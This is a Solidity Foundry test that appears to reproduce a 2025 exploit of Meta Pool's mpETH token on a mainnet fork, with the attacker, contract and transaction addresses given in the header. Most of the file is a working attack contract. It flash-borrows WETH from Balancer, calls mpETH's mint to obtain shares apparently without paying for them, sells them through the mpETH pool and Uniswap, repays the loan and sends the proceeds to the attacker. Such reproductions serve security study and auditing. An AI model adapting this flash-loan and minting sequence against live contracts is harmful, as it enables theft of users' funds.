// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 25k USD
// Attacker : https://etherscan.io/address/0x48f1d0f5831eb6e544f8cbde777b527b87a1be98
// Attack Contract : https://etherscan.io/address/0xff13d5899aa7d84c10e4cd6fb030b80554424136
// Vulnerable Contract : https://etherscan.io/address/0x48afbbd342f64ef8a9ab1c143719b63c2ad81710
// Attack Tx : https://etherscan.io/tx/0x57ee419a001d85085478d04dd2a73daa91175b1d7c11d8a8fb5622c56fd1fa69

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x48afbbd342f64ef8a9ab1c143719b63c2ad81710#code

// @Analysis
// Post-mortem : https://www.coindesk.com/business/2025/06/17/liquid-staking-protocol-meta-pool-suffers-usd27m-exploit
// Twitter Guy : https://x.com/peckshield/status/1934895187102454206
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant MPETH_ADDR = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
address constant MPETH_TO_ETH_POOL = 0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc;
address constant UNISWAP_V3_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;

contract MetaPool is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 22722911 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        MetaPoolExploit exploit = new MetaPoolExploit();
        exploit.start();

        uint256 amount = IMpEth(MPETH_ADDR).balanceOf(address(this));
        console.log("Attacker mpETH balance After exploit: ", amount);
    }

    receive() external payable {}
}

contract MetaPoolExploit {
    address attacker;
    constructor() {
        attacker = msg.sender;
    }
    function start() external {
        // Step 1: borrow 200 weth
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_ADDR;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory data
    ) public {
        IWETH weth = IWETH(payable(WETH_ADDR));
        IMpEth mpEth = IMpEth(MPETH_ADDR);
        IMpEthPool mpEthPool = IMpEthPool(MPETH_TO_ETH_POOL);
        IV3SwapRouter v3SwapRouter = IV3SwapRouter(UNISWAP_V3_ROUTER);

        // Step 2: convert 107 weth to eth
        weth.withdraw(107 ether);

        // Step 3: convert 107 eth to ~97 mpeth
        uint256 amount = mpEth.depositETH{value: 107 ether}(address(this));
        mpEth.mint(amount, address(this));
        // 97,019,503,948,141,950,925 mpETH

        // Step 4: swap mpETH for ETH from mpETH / ETH pool
        mpEth.approve(MPETH_TO_ETH_POOL, type(uint256).max);
        mpEthPool.swapmpETHforETH(97 ether, 0);
        // ~96.36 eth
        mpEthPool.swapmpETHforETH(9.6 ether, 0);
        // ~9.64 eth

        // Step 5: swap mpETH for ETH from Uniswap V3 Router
        mpEth.approve(UNISWAP_V3_ROUTER, 1_000_000_000 ether);
        IV3SwapRouter.ExactInputSingleParams memory _params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: MPETH_ADDR,
            tokenOut: WETH_ADDR,
            fee: 100,
            recipient: address(this),
            amountIn: 10 ether,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        v3SwapRouter.exactInputSingle(_params);
        // 9999023359504975714
        
        // Step 6: ETH -> WETH
        uint256 ethBalance = address(this).balance;
        weth.deposit{value: ethBalance}();

        // Step 7: repay flash loan
        IWETH(payable(WETH_ADDR)).transfer(BALANCER_VAULT, 200 ether);

        // Step 8: WETH -> ETH
        uint256 wethBalance = IWETH(payable(WETH_ADDR)).balanceOf(address(this));
        IWETH(payable(WETH_ADDR)).withdraw(wethBalance);
        
        // Step 9: send ETH to attacker
        ethBalance = address(this).balance;
        payable(attacker).call{value: ethBalance}("");
        // 8.98 eth

        // Step 10: send mpETH to attacker
        uint256 mpEthBalance = IMpEth(MPETH_ADDR).balanceOf(address(this));
        IMpEth(MPETH_ADDR).transfer(attacker, mpEthBalance);
    }

    receive() external payable {}
}

interface IMpEth is IERC20 {
    function depositETH(address receiver) external payable returns (uint256);
    function mint(uint256 shares, address receiver) external;
}

interface IMpEthPool {
    function swapmpETHforETH(uint256 amount, uint256 minAmountOut) external;
}

interface IV3SwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256);
}
